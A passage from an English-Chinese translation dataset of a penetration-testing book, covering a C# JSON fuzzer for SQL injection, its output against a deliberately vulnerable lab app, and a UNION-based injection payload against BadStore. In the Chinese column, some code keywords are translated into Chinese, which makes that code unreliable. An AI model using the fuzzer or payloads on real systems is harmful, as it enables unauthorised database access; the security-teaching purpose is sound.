  id: totrans-323
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: private static void IterateAndFuzz(string url, JObject obj)
- en: '{'
  id: totrans-324
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: foreach (var pair in (JObject)➊obj.DeepClone())
  id: totrans-325
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: foreach (var pair in (JObject)➊obj.DeepClone())
- en: '{'
  id: totrans-326
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: if (pair.Value.Type == ➋JTokenType.String || pair.Value.Type == ➌JTokenType.Integer)
  id: totrans-327
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (pair.Value.Type == ➋JTokenType.String || pair.Value.Type == ➌JTokenType.Integer)
- en: '{'
  id: totrans-328
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: 'Console.WriteLine("Fuzzing key: " + pair.Key);'
  id: totrans-329
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("正在模糊测试键： " + pair.Key);
- en: ''
  id: totrans-330
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (pair.Value.Type == JTokenType.Integer)
  id: totrans-331
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (pair.Value.Type == JTokenType.Integer)
- en: ➍Console.WriteLine("Converting int type to string to fuzz");
  id: totrans-332
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➍Console.WriteLine("将 int 类型转换为字符串进行模糊测试");
- en: ''
  id: totrans-333
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: JToken oldVal = ➎pair.Value;
  id: totrans-334
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: JToken oldVal = ➎pair.Value;
- en: obj[pair.Key] = ➏pair.Value.ToString() + "'";
  id: totrans-335
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: obj[pair.Key] = ➏pair.Value.ToString() + "'";
- en: ''
  id: totrans-336
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (➐Fuzz(url, obj.Root))
  id: totrans-337
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (➐Fuzz(url, obj.Root))
- en: 'Console.WriteLine("SQL injection vector: " + pair.Key);'
  id: totrans-338
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine("SQL 注入向量： " + pair.Key);
- en: else
  id: totrans-339
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: else
- en: Console.WriteLine (pair.Key + " does not seem vulnerable.");
  id: totrans-340
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Console.WriteLine(pair.Key + " 似乎没有漏洞。");
- en: ''
  id: totrans-341
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: ➑obj[pair.Key] = oldVal;
  id: totrans-342
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➑obj[pair.Key] = oldVal;
- en: '}'
  id: totrans-343
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-344
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-345
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-22: The  IterateAndFuzz()  method, which determines which key/value
    pairs in the JSON to fuzz'
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 2-22：IterateAndFuzz() 方法，用于确定 JSON 中哪些键值对需要进行模糊测试
- en: The IterateAndFuzz() method starts by looping over the key/value pairs in the
    JObject with a foreach loop. Because we will be altering the values within the
    JSON by inserting apostrophes into them, we call DeepClone() ➊ so that we get
    a separate object that is identical to the first. This allows us to iterate over
    one copy of the JSON key/value pairs while altering another. (We need to make
    a copy because while in a foreach loop, you can’t alter the object you are iterating
    over.) Within the foreach loop, we test whether the value in the current key/value
    pair is a JTokenType.String ➋ or JTokenType.Integer ➌ and continue fuzzing that
    value if the value is either the string or integer type. After printing a message
    ➍ to alert the user as to which key we are fuzzing, we test whether the value
    is an integer in order to let the user know that we are converting the value from
    an integer to a string.
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: IterateAndFuzz() 方法通过在 JObject 中使用 foreach 循环遍历键/值对开始。因为我们将在 JSON 中插入撇号以修改值，所以我们调用
    DeepClone() ➊ 来获取一个与原始对象相同的副本。这允许我们在修改另一个副本的同时，遍历 JSON 键/值对的一个副本。（我们需要复制一个副本，因为在
    foreach 循环中，无法修改正在遍历的对象。）在 foreach 循环内，我们测试当前键/值对的值是否为 JTokenType.String ➋ 或 JTokenType.Integer
    ➌，如果是字符串或整数类型，我们将继续对该值进行模糊测试。打印一条消息 ➍ 来提醒用户我们正在模糊测试哪个键后，我们测试该值是否为整数，以便告知用户我们正在将值从整数转换为字符串。
- en: NOTE
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: Because integers in JSON have no quotes and must be a whole number or float,
    inserting a value with an apostrophe would cause a parsing exception. Many weakly
    typed web applications built with Ruby on Rails or Python will not care whether
    the JSON value changes type, but strongly typed web applications built with Java
    or C# might not behave as expected. The CsharpVulnJson web application does not
    care whether the type is changed on purpose.
  id: totrans-349
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 由于 JSON 中的整数没有引号，且必须是整数或浮点数，插入带有撇号的值会导致解析异常。许多用 Ruby on Rails 或 Python 构建的弱类型
    Web 应用程序不会关心 JSON 值是否发生类型变化，但使用 Java 或 C# 构建的强类型 Web 应用程序可能不会按预期工作。CsharpVulnJson
    Web 应用程序不会关心类型是否故意改变。
- en: Next, we store the old value in the oldVal variable ➎ so that we can replace
    it once we have fuzzed the current key/value pair. After storing the old value,
    we reassign the current value ➏ with the original value, but with an apostrophe
    tacked on the end of the value so that if it is placed in a SQL query, it should
    cause a parsing exception.
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将旧值存储在 oldVal 变量中 ➎，以便在对当前键/值对进行模糊测试后可以将其替换。在存储了旧值之后，我们重新赋值当前值 ➏ 为原始值，但在值的末尾加上一个撇号，这样如果它被放入
    SQL 查询中，应该会导致解析异常。
- en: To determine whether the altered value will cause an error in the web application,
    we pass the altered JSON and the URL to send it to the Fuzz() method ➐ (discussed
    next), which returns a Boolean value that tells us whether the JSON value could
    be vulnerable to SQL injection. If Fuzz() returns true, we inform the user that
    the value may be vulnerable to SQL injection. If Fuzz() returns false, we tell
    the user that the key does not seem vulnerable.
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确定修改后的值是否会导致 Web 应用程序出现错误，我们将修改后的 JSON 和 URL 传递给 Fuzz() 方法 ➐（将在接下来的讨论中介绍），该方法返回一个布尔值，告诉我们该
    JSON 值是否可能容易受到 SQL 注入攻击。如果 Fuzz() 返回 true，我们会通知用户该值可能容易受到 SQL 注入攻击。如果 Fuzz() 返回
    false，我们会告诉用户该键似乎不容易受到攻击。
- en: Once we have determined whether a value is vulnerable to SQL injection, we replace
    the altered JSON value with the original value ➑ and go on to the next key/value
    pair.
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们确定某个值是否容易受到 SQL 注入攻击，我们将用原始值 ➑ 替换被修改的 JSON 值，然后继续处理下一个键/值对。
- en: Fuzzing with an HTTP Request
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 HTTP 请求进行模糊测试
- en: Finally, we need to make the actual HTTP requests with the tainted JSON values
    and read the response back from the server in order to determine whether the value
    might be injectable. [Listing 2-23](#filepos181596) shows how the Fuzz() method
    creates an HTTP request and tests the response for specific strings to determine
    if the JSON value is susceptible to a SQL injection vulnerability.
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们需要使用被污染的 JSON 值发起实际的 HTTP 请求，并从服务器读取响应，以确定该值是否可能存在注入风险。[列表 2-23](#filepos181596)
    显示了 Fuzz() 方法如何创建 HTTP 请求并测试响应中的特定字符串，以确定 JSON 值是否容易受到 SQL 注入攻击。
- en: private static bool Fuzz(string url, JToken obj)
  id: totrans-355
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: private static bool Fuzz(string url, JToken obj)
- en: '{'
  id: totrans-356
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: byte[] data = System.Text.Encoding.ASCII.➊GetBytes(obj.➋ToString());
  id: totrans-357
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] data = System.Text.Encoding.ASCII.➊GetBytes(obj.➋ToString());
- en: ''
  id: totrans-358
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: HttpWebRequest req = (HttpWebRequest)➌WebRequest.Create(url);
  id: totrans-359
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: HttpWebRequest req = (HttpWebRequest)➌WebRequest.Create(url);
- en: req.Method = "POST";
  id: totrans-360
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: req.Method = "POST";
- en: req.ContentLength = data.Length;
  id: totrans-361
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: req.ContentLength = data.Length;
- en: req.ContentType = "application/javascript";
  id: totrans-362
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: req.ContentType = "application/javascript";
- en: using (Stream stream = req.➍GetRequestStream())
  id: totrans-363
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (Stream stream = req.➍GetRequestStream())
- en: stream.➎Write(data, 0, data.Length);
  id: totrans-364
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: stream.➎Write(data, 0, data.Length);
- en: ''
  id: totrans-365
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: try
  id: totrans-366
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 尝试
- en: '{'
  id: totrans-367
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: req.➏GetResponse();
  id: totrans-368
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: req.➏GetResponse();
- en: '}'
  id: totrans-369
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: catch (WebException e)
  id: totrans-370
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 捕获 (WebException e)
- en: '{'
  id: totrans-371
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string resp = string.Empty;
  id: totrans-372
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 字符串 resp = string.Empty;
- en: using (StreamReader r = new StreamReader(e.Response.➐GetResponseStream()))
  id: totrans-373
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (StreamReader r = new StreamReader(e.Response.➐GetResponseStream()))
- en: resp = r.➑ReadToEnd();
  id: totrans-374
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: resp = r.➑ReadToEnd();
- en: ''
  id: totrans-375
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: return (resp.➒Contains("syntax error") || resp.➓Contains("unterminated"));
  id: totrans-376
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 返回 (resp.➒Contains("syntax error") || resp.➓Contains("unterminated"));
- en: '}'
  id: totrans-377
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-378
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: return false;
  id: totrans-379
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 返回 false;
- en: '}'
  id: totrans-380
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 2-23: The  Fuzz()  method, which does the actual communication with
    the server'
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 2-23：Fuzz() 方法，它执行与服务器的实际通信
- en: Because we need to send the whole JSON string as bytes, we pass the string version
    of our JObject returned by ToString() ➋ to the GetBytes() ➊ method, which returns
    a byte array representing the JSON string. We also build the initial HTTP request
    to be made by calling the static Create() method ➌ from the WebRequest class to
    create a new WebRequest, casting the resulting object to an HttpWebRequest class.
    Next, we assign the HTTP method, the content length, and the content type of the
    request. We assign the Method property a value of POST because the default is
    GET, and we assign the length of our byte array that we will be sending to the
    ContentLength property. Finally, we assign application/javascript to the ContentType
    to ensure the web server knows that the data it is receiving should be well-formed
    JSON.
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: 因为我们需要将整个 JSON 字符串作为字节发送，我们将通过 ToString() ➋ 方法返回的 JObject 字符串版本传递给 GetBytes()
    ➊ 方法，该方法返回一个表示 JSON 字符串的字节数组。我们还通过调用 WebRequest 类的静态 Create() 方法 ➌ 来构建初始 HTTP
    请求，以创建一个新的 WebRequest，并将结果对象强制转换为 HttpWebRequest 类。接下来，我们为请求分配 HTTP 方法、内容长度和内容类型。我们将
    Method 属性的值设置为 POST，因为默认值是 GET，并将我们要发送的字节数组的长度分配给 ContentLength 属性。最后，我们将 ContentType
    设置为 application/javascript，以确保 Web 服务器知道它接收到的数据应该是格式良好的 JSON。
- en: 'Now we write our JSON data to the request stream. We call the GetRequestStream()
    method ➍ and assign the stream returned to a variable in the context of a using
    statement so that our stream is disposed of properly after use. We then call the
    stream’s Write() method ➎, which takes three arguments: the byte array containing
    our JSON data, the index of the array we want to begin writing from, and the number
    of bytes we want to write. (Because we want to write all of them, we pass in the
    entire length of the data array.) To get the response back from the server, we
    create a try block so that we can catch any exceptions and retrieve their responses.
    We call GetResponse() ➏ within the try block to attempt to retrieve a response
    from the server, but we only care about responses with HTTP return codes of 500
    or higher, which would cause GetResponse() to throw an exception.'
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们将我们的 JSON 数据写入请求流中。我们调用 GetRequestStream() 方法 ➍ 并将返回的流分配给一个变量，并使用 using
    语句来确保在使用后流被正确地释放。然后，我们调用流的 Write() 方法 ➎，该方法接受三个参数：包含 JSON 数据的字节数组、我们希望开始写入的数组索引，以及我们希望写入的字节数。（因为我们希望写入所有数据，所以传入数据数组的整个长度。）为了从服务器获取响应，我们创建一个
    try 块，以便捕获任何异常并获取它们的响应。我们在 try 块内调用 GetResponse() ➏ 尝试从服务器获取响应，但我们只关心返回 HTTP 状态码为
    500 或更高的响应，这将导致 GetResponse() 抛出异常。
- en: In order to catch these responses, we follow the try block with a catch block
    in which we call GetResponseStream() ➐ and create a new StreamReader from the
    stream returned. Using the stream’s ReadToEnd() method ➑, we store the server’s
    response in the string variable resp (declared before the try block started).
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: 为了捕获这些响应，我们在 try 块后跟一个 catch 块，在其中我们调用 GetResponseStream() ➐ 并从返回的流创建一个新的 StreamReader。使用流的
    ReadToEnd() 方法 ➑，我们将服务器的响应存储在字符串变量 resp 中（该变量在 try 块开始之前声明）。
- en: To determine whether the value sent may have caused a SQL error, we test the
    response for one of two known strings that appear in SQL errors. The first string,
    "syntax error" ➒, is a general string that is present in the MySQL error, as shown
    in [Listing 2-24](#filepos185118).
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确定发送的值是否可能导致 SQL 错误，我们测试响应中是否包含 SQL 错误中出现的两个已知字符串之一。第一个字符串 "syntax error"
    ➒ 是一个通用字符串，在 MySQL 错误中出现，如示例 [2-24](#filepos185118) 所示。
- en: 'ERROR: 42601: syntax error at or near &quot;dsa&quot; Listing 2-24: Sample
    MySQL error message containing  syntax error'
  id: totrans-386
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 错误：42601：语法错误，在 &quot;dsa&quot; 附近 示例 2-24：包含语法错误的 MySQL 错误消息
- en: The second string, "unterminated" ➓, appears in a specific MySQL error when
    a string is not terminated, as in [Listing 2-25](#filepos185646).
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
  zh: 第二个字符串 "unterminated" ➓，出现在特定的 MySQL 错误中，当字符串没有结束时，如[示例 2-25](#filepos185646)所示。
- en: 'ERROR: 42601: unterminated quoted string at or near "''); "'
  id: totrans-388
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 错误：42601：在 "'); " 附近出现了未结束的引号字符串
- en: 'Listing 2-25: Sample MySQL error message containing  unterminated'
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 2-25：包含 unterminated 的 MySQL 错误消息示例
- en: The appearance of either error message could mean a SQL injection vulnerability
    exists within an application. If the response from an error returned contains
    either string, we return a value of true to the calling method, which means we
    think the application is vulnerable. Otherwise, we return false.
  id: totrans-390
  prefs: []
  type: TYPE_NORMAL
  zh: 任何错误消息的出现都可能意味着应用程序中存在 SQL 注入漏洞。如果错误响应中包含了这两种字符串中的任意一种，我们就返回一个 true 值给调用方法，这意味着我们认为该应用程序易受攻击。否则，我们返回
    false。
- en: Testing the JSON Fuzzer
  id: totrans-391
  prefs: []
  type: TYPE_NORMAL
  zh: 测试 JSON 模糊测试器
- en: Having completed the three methods required to fuzz the HTTP JSON request, we
    can test the Create User HTTP request, as shown in [Listing 2-26](#filepos188282).
  id: totrans-392
  prefs: []
  type: TYPE_NORMAL
  zh: 完成了模糊测试 HTTP JSON 请求所需的三种方法后，我们可以测试 Create User HTTP 请求，如[示例 2-26](#filepos188282)所示。
- en: $ fuzzer.exe http://192.168.1.56/Vulnerable.ashx /Users/bperry/req_vulnjson
  id: totrans-393
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ fuzzer.exe http://192.168.1.56/Vulnerable.ashx /Users/bperry/req_vulnjson
- en: Fuzzing POST requests to URL http://192.168.1.13/Vulnerable.ashx
  id: totrans-394
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 对 URL http://192.168.1.13/Vulnerable.ashx 进行 POST 请求模糊测试
- en: 'Fuzzing key: username'
  id: totrans-395
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：username
- en: 'SQL injection vector: username'
  id: totrans-396
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：username
- en: 'Fuzzing key: password'
  id: totrans-397
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：password
- en: 'SQL injection vector: password'
  id: totrans-398
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：password
- en: 'Fuzzing key: age➊'
  id: totrans-399
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：age➊
- en: Converting int type to string to fuzz
  id: totrans-400
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 将 int 类型转换为字符串进行模糊测试
- en: 'SQL injection vector: age'
  id: totrans-401
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：age
- en: 'Fuzzing key: line1'
  id: totrans-402
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：line1
- en: 'SQL injection vector: line1'
  id: totrans-403
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：line1
- en: 'Fuzzing key: line2'
  id: totrans-404
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：line2
- en: 'SQL injection vector: line2'
  id: totrans-405
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：line2
- en: 'Fuzzing key: city'
  id: totrans-406
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：city
- en: 'SQL injection vector: city'
  id: totrans-407
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：city
- en: 'Fuzzing key: state'
  id: totrans-408
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：state
- en: 'SQL injection vector: state'
  id: totrans-409
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：state
- en: 'Fuzzing key: zip➋'
  id: totrans-410
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：zip➋
- en: Converting int type to string to fuzz
  id: totrans-411
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 将 int 类型转换为字符串进行模糊测试
- en: 'SQL injection vector: zip'
  id: totrans-412
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SQL 注入向量：zip
- en: 'Fuzzing key: first'
  id: totrans-413
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：first
- en: first does not seem vulnerable.
  id: totrans-414
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: first 似乎不易受到攻击。
- en: 'Fuzzing key: middle'
  id: totrans-415
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：middle
- en: middle does not seem vulnerable.
  id: totrans-416
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: middle 似乎不易受到攻击。
- en: 'Fuzzing key: last'
  id: totrans-417
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：last
- en: last does not seem vulnerable.
  id: totrans-418
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: last 似乎不易受到攻击。
- en: 'Fuzzing key: method➌'
  id: totrans-419
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Fuzzing 键：method➌
- en: method does not seem vulnerable.
  id: totrans-420
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: method 似乎不易受到攻击。
- en: 'Listing 2-26: The output from running the JSON fuzzer against the CsharpVulnJson
    application'
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 2-26：运行 JSON 模糊测试器对 CsharpVulnJson 应用程序进行测试的输出
- en: Running the fuzzer on the Create User request should show that most parameters
    are vulnerable to a SQL injection attack (the lines beginning with SQL injection
    vector), except for the method JSON key ➌ used by the web application to determine
    which operation to complete. Notice that even the age ➊ and zip ➋ parameters,
    originally integers in the JSON, are vulnerable if they are converted to a string
    when tested.
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Create User 请求上运行模糊测试器应该显示大多数参数都容易受到 SQL 注入攻击（以 SQL 注入向量开头的行），除了由 Web 应用程序用于确定完成哪个操作的方法
    JSON 键 ➌。请注意，即使是原本是整数的 age ➊ 和 zip ➋ 参数，在测试时如果转换为字符串，它们也会变得易受攻击。
- en: Exploiting SQL Injections
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
  zh: 利用 SQL 注入
- en: Finding possible SQL injections is only half the job of a penetration tester;
    exploiting them is the more important and more difficult half. Earlier in the
    chapter, we used a URL from BadStore to fuzz HTTP query string parameters, one
    of which was a vulnerable query string parameter called searchquery (refer back
    to [Listing 2-13](#filepos147136) on [page 25](#filepos114239)). The URL query
    string parameter searchquery is vulnerable to two types of SQL injection techniques.
    Both injection types (boolean based and UNION based) are incredibly useful to
    understand, so I’ll describe writing exploits for both types using the same vulnerable
    BadStore URL.
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: 寻找可能的 SQL 注入仅是渗透测试的一半工作；利用它们才是更重要且更难的部分。在本章前面，我们使用 BadStore 的 URL 来模糊测试 HTTP
    查询字符串参数，其中一个参数是易受攻击的查询字符串参数 searchquery（请参见[示例 2-13](#filepos147136)中的内容，[第 25
    页](#filepos114239)）。searchquery 查询字符串参数容易受到两种类型的 SQL 注入攻击。这两种注入方式（基于布尔值和基于 UNION）都非常有用，因此我将描述如何为这两种类型编写利用代码，使用相同的易受攻击的
    BadStore URL。
- en: The UNION technique is the easier one to use when exploiting SQL injections.
    It’s possible to use a UNION in SELECT query injections when you’re able to control
    the end of the SQL query. An attacker who can append a UNION statement to the
    end of a SELECT statement can return more rows of data to the web application
    than originally intended by the programmer.
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: UNION技术是在利用SQL注入时最容易使用的一种方法。当你能够控制SQL查询的结尾时，可以在SELECT查询注入中使用UNION。攻击者如果能够将UNION语句附加到SELECT语句的末尾，就可以向Web应用程序返回比程序员原本预期的更多的数据行。
- en: One of the trickiest parts of figuring out a UNION injection lies in balancing
    the columns. In essence, you must balance the same number of columns with the
    UNION clause as the original SELECT statement returns from the database. Another
    challenge lies in being able to programmatically tell where your injected results
    appear in the response from the web server.
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: 理解UNION注入最棘手的部分之一是平衡列数。从本质上讲，你必须平衡UNION子句中的列数与原始SELECT语句从数据库中返回的列数相同。另一个挑战是能够编程地确定你注入的结果出现在Web服务器的响应中的位置。
- en: Performing a UNION-Based Exploit by Hand
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: 手动执行基于UNION的漏洞利用
- en: Using UNION-based SQL injections is the fastest way to retrieve data from a
    database. In order to retrieve attacker-controlled data from the database with
    this technique, we must build a payload that retrieves the same number of columns
    as the original SQL query in the web application. Once we can balance the columns,
    we need to be able to programmatically find the data from the database in the
    HTTP response.
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: 使用基于UNION的SQL注入是从数据库中检索数据的最快方法。为了通过这种技术从数据库中检索攻击者控制的数据，我们必须构建一个负载，检索与Web应用程序中原始SQL查询相同数量的列。一旦我们能够平衡列数，就需要能够程序化地从HTTP响应中找到来自数据库的数据。
- en: When an attempt is made to balance the columns in a UNION-injectable SQL injection
    and the columns don’t balance, the error generally returned by the web application
    using MySQL is similar to that shown in [Listing 2-27](#filepos191984).
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
  zh: 当试图平衡UNION可注入SQL注入中的列数时，如果列数不匹配，Web应用程序（使用MySQL）通常会返回类似[列表2-27](#filepos191984)所示的错误。
- en: The used SELECT statements have a different number of columns...
  id: totrans-430
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用的SELECT语句列数不同...
- en: 'Listing 2-27: Sample MySQL error when  SELECT  queries on the left and right
    of  UNION  aren’t balanced'
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
  zh: 列表2-27：当UNION左右两边的SELECT查询列数不平衡时，MySQL返回的示例错误
- en: Let’s take the vulnerable line of code in the BadStore web application (badstore.cgi,
    line 203) and see how many columns it is selecting (see [Listing 2-28](#filepos192786)).
  id: totrans-432
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看一下BadStore Web应用程序中的漏洞代码行（badstore.cgi，第203行），看看它选择了多少列（参见[列表2-28](#filepos192786)）。
- en: '$sql="SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE ''$squery'' IN
    (itemnum,sdesc,ldesc)"; Listing 2-28: Vulnerable line in the BadStore web application
    selecting four columns'
  id: totrans-433
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $sql="SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '$squery' IN (itemnum,sdesc,ldesc)";
    列表2-28：BadStore Web应用程序中的漏洞代码行，选择四列
- en: Balancing SELECT statements takes a bit of testing, but I know from reading
    the source code of BadStore that this particular SELECT query returns four columns.
    When passing in the payload with spaces that are URL-encoded as plus signs, as
    shown in [Listing 2-29](#filepos193534), we find the word hacked returned as a
    row in the search results.
  id: totrans-434
  prefs: []
  type: TYPE_NORMAL
  zh: 平衡SELECT语句需要一些测试，但我从阅读BadStore的源代码中知道，这个特定的SELECT查询返回四列。当我们传递带有空格并用加号URL编码的负载时，如[列表2-29](#filepos193534)所示，我们发现"hacked"一词作为一行出现在搜索结果中。
- en: searchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, 'hacked', NULL%23
  id: totrans-435
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: searchquery=fdas'+UNION+ALL+SELECT+NULL, NULL, 'hacked', NULL%23
- en: 'Listing 2-29: Properly balanced SQL injection that brings the word  hacked  back
    from the database'
  id: totrans-436
  prefs: []
  type: TYPE_NORMAL
  zh: 列表2-29：正确平衡的SQL注入，成功从数据库中返回"hacked"一词
- en: When the searchquery value in this payload is passed to the application, the
    searchquery variable is used directly in the SQL query sent to the database, and
    we turn the original SQL query ([Listing 2-28](#filepos192786)) into a new SQL
    query not intended by the original programmer, as shown in [Listing 2-30](#filepos194479).
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: 当这个负载中的searchquery值传递给应用程序时，searchquery变量直接用于发送到数据库的SQL查询中，我们将原始SQL查询（[列表2-28](#filepos192786)）转变为一个原始程序员未曾预期的新SQL查询，如[列表2-30](#filepos194479)所示。
- en: SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE 'fdas' UNION ALL SELECT
  id: totrans-438
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE 'fdas' UNION ALL SELECT
- en: 'NULL, NULL, ''hacked'', NULL➊# '' IN (itemnum,sdesc,ldesc) Listing 2-30: Full
    SQL query with the payload appended that returns the word  hacked'
  id: totrans-439
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: NULL, NULL, 'hacked', NULL➊# ' IN (itemnum,sdesc,ldesc) 列表2-30：完整的SQL查询，附加负载后返回"hacked"一词
- en: We use a hash mark ➊ to truncate the original SQL query, turning any SQL code
    following our payload into a comment that will not be run by MySQL. Now, any extra
    data (the word hacked in this case) that we want returned in the web server’s
    response should be in the third column of the UNION.
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
- en: Humans can determine fairly easily where the data returned by the payload shows
    up in the web page after exploitation. A computer, however, needs to be told where
